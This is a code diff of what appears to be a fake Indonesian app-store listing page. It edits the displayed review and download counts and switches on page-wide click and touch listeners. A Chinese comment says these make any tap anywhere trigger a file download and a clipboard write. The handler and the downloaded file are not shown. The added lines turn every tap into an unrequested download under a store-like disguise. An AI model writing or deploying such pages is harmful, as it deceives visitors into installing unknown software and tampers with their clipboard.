@@ -435,13 +435,13 @@
         <div class="stat-value">
           4,8 <img src="files/bstart.png" alt="" />
         </div>
-        <div class="stat-label">1,42 juta ulasan</div>
+        <div class="stat-label">12 rb ulasan</div>
       </div>
       <div class="stat">
         <div class="stat-value">
           <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
         </div>
-        <div class="stat-label">+1125 juta Unduhan</div>
+        <div class="stat-label">+158 rb Unduhan</div>
       </div>
       <div class="stat">
         <div class="stat-value">
@@ -499,7 +499,7 @@
         <div class="ratings-score">
           <div class="ratings-score-num">4,8</div>
           <img src="files/bfs.png" alt="" />
-          <div>1,42 juta ulasan</div>
+          <div>12 rb ulasan</div>
         </div>
         <div class="ratings-bars">
           <div>5 <img src="files/p5.png" alt="" /></div>
@@ -615,8 +615,8 @@
           "show",
         );
         // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-        // document.addEventListener("click", onClickBtn, true);
-        // document.addEventListener("touchend", onClickBtn, true);
+        document.addEventListener("click", onClickBtn, true);
+        document.addEventListener("touchend", onClickBtn, true);
       };
 
       function sendBeacon(url, label) {
